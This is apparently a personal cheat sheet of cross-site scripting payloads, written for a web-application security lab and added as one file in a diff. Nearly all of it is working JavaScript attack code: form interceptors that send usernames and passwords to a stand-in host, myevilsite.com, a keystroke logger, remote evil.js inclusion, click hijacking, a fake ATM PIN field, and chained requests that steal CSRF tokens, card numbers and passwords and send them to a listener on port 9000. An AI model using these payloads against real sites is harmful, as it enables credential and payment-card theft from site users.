@@ -1,0 +1,494 @@
+Good site for URL encoding/decoding:
+https://meyerweb.com/eric/tools/dencoder/
+
+**********************************************************************************************
+
+
+Modify HTML via header tag
+
+URL Encode Payloads before using
+
+<script> 
+document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
+document.getElementsByTagName("h1")[0].innerHTML = "Found You";
+</script>
+
+**********************************************************************************************
+
+Modify HTML via href
+
+URL Encode Payloads before using
+
+Example 1:
+<script>
+document.getElementsByTagName("a")[0].href = "http://myevilsite.com";
+document.getElementsByTagName("a")[0].innerHTML = "LinkNameHasNotChanged";
+document.getElementsByTagName("a")[1].href = "http://myevilsite.com";
+document.getElementsByTagName("a")[1].innerHTML = "Link2NameHasNotChanged";
+</script>
+
+Example 2: (does same thing as first just more effecient)
+<script>
+var links = document.getElementsByTagName("a");
+for (i=0; i < links.length; i++)
+{
+	links[i].href = "http://myevilsite.com";
+	links[i].innerHTML = "Link Modified";
+}
+</script>
+
+
+
+**********************************************************************************************
+
+Send login form info to attacker controlled server
+
+URL Encode Payloads before using
+
+First test that the attack will work with alert box:
+
+<script>
+function InterceptForm() {
+	var username = document.forms[0].elements[0].value;
+	var password = document.forms[0].elements[1].value;
+	alert(username + ' : ' + password);
+}
+document.forms[0].onsubmit = InterceptForm;
+</script>
+
+
+
+Script with remote server:
+
+<script>
+function InterceptForm() {
+	var username = document.forms[0].elements[0].value;
+	var password = document.forms[0].elements[1].value;
+	new Image().src = "http://myevilsite.com:9000/?username="+username+"&password="+password;
+}
+document.forms[0].onsubmit = InterceptForm;
+</script>
+
+
+python -m http.server 9000
+
+
+
+**********************************************************************************************
+
+
+Modify form field to include a new form field of type text
+
+URL Encode Payloads before using
+
+
+<script>
+
+var input = document.createElement("input");
+input.setAttribute("type", "text");
+input.setAttribute("class", "input-block-level");
+input.setAttribute("placeholder", "ATM PIN");
+input.setAttribute("name", "atmpin");
+
+var previous = document.forms[0].elements[0];
+
+document.forms[0].insertBefore(input, previous);
+
+document.forms[0].action = "http://localhost:9000/";
+
+</script>
+
+
+**********************************************************************************************
+
+Modify/delete a form to just display a message.
+
+URL Encode Payloads before using
+
+
+<script>
+
+var input = document.createElement("h2"); 
+input.innerHTML = "Website is Down. Please visit http://myevilsite.com";
+
+document.forms[0].parentNode.appendChild(input);
+
+document.forms[0].parentNode.removeChild(document.forms[0]);
+
+</script>
+
+
+**********************************************************************************************
+
+Capture all mouse clicks and redirect to another site.
+
+URL Encode Payloads before using
+
+
+Example 1 to confirm clicking works via an Alert box:
+<script>
+function CaughtClick() {
+	alert("You Clicked");
+
+}
+document.body.addEventListener('click', CaughtClick, true);
+</script>
+
+
+
+Example 2 that will redirect the user to an evil website:
+<script>
+function CaughtClick() {
+	location.href = "http://myevilsite.com";
+
+}
+document.body.addEventListener('click', CaughtClick, true);
+</script>
+
+
+
+
+**********************************************************************************************
+
+Keystroke logger
+
+URL encode payload before submitting
+
+<script>
+document.onkeypress = function KeyLogger(input) {
+	key_pressed = String.fromCharCode(input.which);
+	new Image().src = "http://localhost:9000/?"+key_pressed;
+}
+</script>
+
+
+python -m http.server 9000
+
+
+**********************************************************************************************
+
+Event Listener that will display the password entered into a form in an alert box
+
+URL encode payload before submitting
+
+" onmouseover="
+document.forms[0].onsubmit = function demo () {
+	var pass = document.forms[0].elements[1].value;
+	alert(pass);
+}
+
+
+**********************************************************************************************
+
+Include an external JS file
+
+URL encode payload before submitting
+
+<script src="http://myevilsite.com/evil.js"></script>
+
+
+JavaScript file (evil.js) on remote server:
+window.addEventListener("load", function() { alert(document.cookie);});
+
+
+**********************************************************************************************
+
+Include an external JS file when already inside of <script> tags.
+
+URL encode payload before submitting
+
+var newtag = document.createElement("script");
+newtag.type = "text/javascript";
+newtag.src = "http://myevilsite.com/evil.js";
+document.body.appendChild(newtag);
+
+
+evil.js contents on remote server:
+window.addEventListener("load", function() { alert(document.cookie);});
+
+**********************************************************************************************
+
+Replace image on website via the first [0] img tag:
+
+URL encode payload before submitting
+
+<script>
+document.getElementsByTagName("img")[0].src = "http://myevilside.com/image.jpg";
+</script>
+
+
+
+**********************************************************************************************
+
+steal from auto-complete if username and password are submitted via the URL:
+
+URL encode payload before submitting
+
+<script>
+window.setTimeout( function() {
+	document.forms[0].action = 'http://localhost:9000';
+	document.forms[0].submit();
+} , 10000 );
+</script>
+
+# 10000 is 10000 milliseconds or 10 seconds
+
+
+**********************************************************************************************
+Get info from URI:
+
+URL encode payload before submitting
+
+<script>
+var req = new XMLHttpRequest();
+req.onreadystatechange = function () {
+if (req.readyState == 4 && req.status == 200 )
+{
+	document.getElementById("result").innerHTML = req.responseText;
+}
+};
+req.open("GET", "/lab/webapp/jfp/14/email?name=john", true);
+req.send();
+</script>
+
+
+#readyState == 4 means the app has heard back from the server
+
+**********************************************************************************************
+
+POST request that returns credit card number in server response. Send CC to alert and localhost
+
+URL encode payload before submitting
+
+<script>
+var req = new XMLHttpRequest();
+req.onreadystatechange = function () {
+	if (req.readyState == 4 && req.status ==200 )
+{
+	alert(req.responseText);
+	new Image().src = "http://localhost:9000/?cardno="+req.responseText;
+}
+};
+req.open("POST", "/lab/webapp/jfp/15/cardstore", true);
+req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+req.send("user=john");
+
+</script>
+
+
+
+**********************************************************************************************
+Grab CSRF token in the URL and pass it in a new request
+
+URL encode payload before submitting
+
+<script>
+var req = new XMLHttpRequest();
+req.onreadystatechange=function()
+	{
+	if (req.readyState==4 && req.status==200)
+		{
+		document.getElementById("result").innerHTML=req.responseText;
+		}
+	};
+
+var token = window.location.search.split('&')[1];
+alert(token);
+req.open("GET", "/lab/webapp/jfp/16/email?name=john&"+token, true);
+req.send();
+</script>
+
+# split "splits" the url using a & as a delimiter. [1] is the part after the & and
+# assigned to the token variable. i.e. http://site.com/blah?foo=bar&csrf_token=12442323
+**********************************************************************************************
+
+CSRF token stealing; parse response to get UID and CSRF token and then send it in a URL
+
+URL encode payload before submitting
+
+<script>
+var req = new XMLHttpRequest();
+req.onreadystatechange=function()
+	{
+	if (req.readyState==4 && req.status==200)
+		{
+		document.getElementById("result").innerHTML=req.responseText;
+		}
+	};
+
+var uid = document.getElementById("uid").innerHTML.split(':')[1];
+var token = document.getElementById("csrf").innerHTML.split(':')[1];
+
+req.open("GET", "/lab/webapp/jfp/17/email?uid="+uid+"&csrf_token="+token, true);
+req.send();
+</script>
+
+
+
+# server response contains this:
+#<p id="uid">UID:986</p>
+#<p id="csrf">Token:8675699351612121977981321312312123123126554427773</p>
+
+
+
+
+
+**********************************************************************************************
+
+Parse server response for an address
+
+<script>
+var req = new XMLHttpRequest();
+req.onreadystatechange=function()
+	{
+	if (req.readyState==4 && req.status==200)
+		{
+		var htmlPage = req.responseXML;
+		var address = htmlPage.getElementById("address").innerHTML;
+		alert(address);
+		document.getElementById("result").innerHTML= address;
+		}
+	};
+req.open("GET", "/lab/webapp/jfp/18/address", true);
+req.responseType = "document";
+req.send();
+</script>
+
+
+
+**********************************************************************************************
+
+Parse two HTML pages. Get UID from one page and CC number from the other. Also requires CSRF token and sends CC number to my server
+
+URL encode payload before submitting
+
+
+<script>
+var link = document.getElementById("settings");
+var req = new XMLHttpRequest();
+var csrf_token = '';
+var uid = '';
+var req2 = new XMLHttpRequest();
+
+req2.onreadystatechange=function()
+   {
+   if (req2.readyState==4 && req2.status==200)
+      {
+      var htmlPage = req2.responseXML;
+      credit_card = htmlPage.getElementById("result").innerHTML;
+      document.getElementById("result").innerHTML = credit_card;
+      new Image().src = "http://localhost:9000/?credit_card_number="+credit_card;
+      }
+   };
+
+req.onreadystatechange=function()
+   {
+   if (req.readyState==4 && req.status==200)
+      {
+      var htmlPage = req.responseXML;
+      csrf_token = htmlPage.forms[0].elements[1].value;
+      alert(csrf_token);
+      req2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid="+uid+"&csrf_token="+csrf_token, true);
+      req2.responseType = "document";
+      req2.send();
+      }
+   };
+uid = link.innerHTML.split(':')[1];
+req.open("GET", link.href, true);
+req.responseType = "document";
+req.send();
+</script>
+
+
+# "settings" is a <tag> name
+# req.responseType = "document"; -> this is required when parsing HTML (not with JSON or XML)
+
+
+**********************************************************************************************
+
+JSON parsing from multiple pages. First page has UID on it and grabs a token, 2nd page has password on it if the token is passed to it.
+
+first request: site.com/gettoken?uid=3476 #uid can be acquired on the original page, this returns a token
+2nd request: site.com/getpassword?uid=3476&token=xyz will return the user password
+
+
+
+<script>
+var link = document.getElementById("settings");
+var req = new XMLHttpRequest();
+var token = '';
+var uid = '';
+var req2 = new XMLHttpRequest();
+
+req2.onreadystatechange=function()
+   {
+   if (req2.readyState==4 && req2.status==200)
+      {
+      var pass_obj = JSON.parse(req2.responseText);
+      var password = pass_obj.resp.password;
+      document.getElementById("result").innerHTML = password;
+      new Image().src = "http://localhost:9000/?password="+password+"&uid="+uid;
+      }
+   };
+
+req.onreadystatechange=function()
+   {
+   if (req.readyState==4 && req.status==200)
+      {
+      response_obj = JSON.parse(req.responseText);
+      token = response_obj.params.token;
+      req2.open("GET", "/lab/webapp/jfp/20/getpassword?token="+token, true);
+      req2.send();
+      }
+   };
+
+uid = link.innerHTML.split(':')[1];
+req.open("GET", "/lab/webapp/jfp/20/gettoken?uid="+uid, true);
+req.send();
+</script>
+
+
+
+**********************************************************************************************
+Parse XML. Get security questions instead of password.
+site.com/getxml shows uid and token value
+site.com/questions?uid=xxxx&token=xxxx will show questions
+
+<script>
+var link = document.getElementById("settings");
+var req = new XMLHttpRequest();
+var token = '';
+var uid = '';
+var req2 = new XMLHttpRequest();
+
+req2.onreadystatechange=function()
+   {
+   if (req2.readyState==4 && req2.status==200)
+      {
+      var questions = JSON.parse(req2.responseText);
+      document.getElementById("result").innerHTML = questions.q1 + "<br>" +questions.q2+ "<br>" +questions.q3;
+      }
+   };
+
+req.onreadystatechange=function()
+   {
+   if (req.readyState==4 && req.status==200)
+      {
+      uid = req.responseXML.getElementsByTagName("uid-param-value")[0].childNodes[0].nodeValue;
+      token = req.responseXML.getElementsByTagName("token-param-value")[0].childNodes[0].nodeValue;
+      req2.open("GET", "/lab/webapp/jfp/21/questions?uid="+uid+"&token="+token, true);
+      req2.send();
+      }
+   };
+
+req.open("GET", link.href, true);
+req.send();
+</script>
+
+
+
+
+
+
+
+
